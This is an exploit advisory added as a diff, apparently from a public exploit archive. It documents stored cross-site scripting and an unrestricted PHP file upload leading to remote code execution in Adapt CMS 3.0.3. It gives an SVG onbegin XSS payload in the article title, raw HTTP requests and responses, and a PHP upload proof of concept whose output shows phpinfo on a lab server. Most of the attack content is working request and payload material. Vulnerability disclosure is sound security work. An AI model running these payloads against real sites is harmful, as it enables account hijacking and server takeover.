@@ -1,0 +1,154 @@
+id: 39333
+date: 02/15/2024
+title: Adapt CMS 3.0.3 Cross Site Scripting / Shell Upload Vulnerabilities
+author: Andrey Stoykov
+cves: 
+
+# Exploit Title: Stored XSS and RCE - adaptcmsv3.0.3
+# Exploit Author: Andrey Stoykov
+# Version: 3.0.3
+# Tested on: Ubuntu 22.04
+# Blog: http://msecureltd.blogspot.com
+
+
+ *Description*
+
+- It was found that adaptcms v3.0.3 was vulnerable to stored cross
+site scripting
+
+- Also the application allowed the file upload functionality to upload
+PHP files which resulted in remote code execution
+
+
+*Stored XSS*
+
+
+*Steps to Reproduce:*
+
+
+   1. Login as admin and add a new article
+   2. In "Title" add the following payload <svg><animate
+onbegin=alert(1) attributeName=x dur=1s>
+   3. The stored XSS would be triggered upon visiting the article by
+normal user
+
+
+// HTTP POST request
+
+POST /adaptcms/admin/articles/preview/?preview=1 HTTP/1.1
+
+Host: 192.168.232.133
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63
+Safari/537.36
+[...]
+
+_method=PUT&data%5B_Token%5D%5Bkey%5D=357ba58e7871f0849edd3c623771a379e2fc1a2c&*data%5BArticle%5D%5Btitle%5D=%3Csvg%3E%3Canimate+onbegin%3Dalert(1)+attributeName%3Dx+dur%3D1s%3E*&data%5BArticleValue%5D%5B0%5D%5Bdata%5D=%3Cp%3ETest%3C%2Fp%3E[...]
+
+
+// HTTP GET request
+
+GET /adaptcms/admin/articles/preview HTTP/1.1
+Host: 192.168.232.133
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63
+Safari/537.36
+[...]
+
+// HTTP response
+
+HTTP/1.1 200 OK
+Server: Apache/2.4.37 (Unix) OpenSSL/1.0.2q PHP/5.6.40
+mod_perl/2.0.8-dev Perl/v5.16.3
+[...]
+
+[...]
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />  *<title>*
+*    AdaptCMS 3.0.3 | <svg><animate onbegin=alert(1) attributeName=x
+dur=1s>  </title>*
+[...]
+
+
+*Unrestricted File Upload*
+
+
+*Steps to Reproduce:*
+
+
+   1. Login as admin and visit the "Media" page
+   2. Click on "Files" then use the "Add File" functionality
+   3. In "File Contents" add the following PHP code <?php phpinfo(); ?>
+
+
+// HTTP POST request
+
+POST /adaptcms/admin/files/add HTTP/1.1
+Host: 192.168.232.133
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63
+Safari/537.36
+[...]
+
+[...]
+------WebKitFormBoundaryVO2wc6i6YcQWk3oU
+*Content-Disposition: form-data; name="data[0][File][dir]"*
+
+*uploads/*
+------WebKitFormBoundaryVO2wc6i6YcQWk3oU
+Content-Disposition: form-data; name="data[0][File][mimetype]"
+
+
+------WebKitFormBoundaryVO2wc6i6YcQWk3oU
+Content-Disposition: form-data; name="data[0][File][filesize]"
+
+
+------WebKitFormBoundaryVO2wc6i6YcQWk3oU
+*Content-Disposition: form-data; name="data[File][content]"*
+
+*<?php phpinfo(); ?>*
+------WebKitFormBoundaryVO2wc6i6YcQWk3oU
+[...]
+
+// HTTP response
+
+HTTP/1.1 302 Found
+Server: Apache/2.4.37 (Unix) OpenSSL/1.0.2q PHP/5.6.40
+mod_perl/2.0.8-dev Perl/v5.16.3
+X-Powered-By: PHP/5.6.40
+*Location: http://192.168.232.133/adaptcms/admin/files
+<http://192.168.232.133/adaptcms/admin/files>*
+[...]
+
+
+// HTTP GET request
+
+GET /adaptcms/uploads/*test-php.php* HTTP/1.1
+Host: 192.168.232.133
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63
+Safari/537.36
+[...]
+
+
+// HTTP response
+
+HTTP/1.1 200 OK
+Server: Apache/2.4.37 (Unix) OpenSSL/1.0.2q PHP/5.6.40
+mod_perl/2.0.8-dev Perl/v5.16.3
+X-Powered-By: PHP/5.6.40
+[...]
+
+[...]
+<h1 class="p">*PHP Version 5.6.40*</h1>
+</td></tr>
+</table>
+<table>
+<tr><td class="e">System </td><td class="v">*Linux ubuntu
+6.5.0-15-generic #15~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Fri Jan 12
+18:54:30 UTC 2 x86_64* </td></tr>
+[...]
+
+#  0day.today [2024-02-19]  #
